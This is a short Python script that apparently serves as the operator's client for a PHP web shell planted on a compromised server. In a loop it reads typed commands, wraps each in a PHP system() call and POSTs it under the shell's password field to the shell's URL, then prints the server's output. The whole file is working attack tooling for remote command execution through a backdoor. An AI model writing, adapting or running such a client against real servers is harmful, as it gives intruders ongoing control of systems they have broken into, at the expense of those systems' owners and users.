import requests


def post_shell_manage(shell_path, shell_password):
    while 1:
        try:
            command = raw_input("[*] input the command:")
            payload = 'system("%s");' % command
            if command != "exit":
                postData = {shell_password: payload}
                r = requests.post(shell_path, data=postData)
                print(r.text.encode(r.encoding))
            else:
                break
        except EOFError:
            print("[*] type 'exit' to quit")
            pass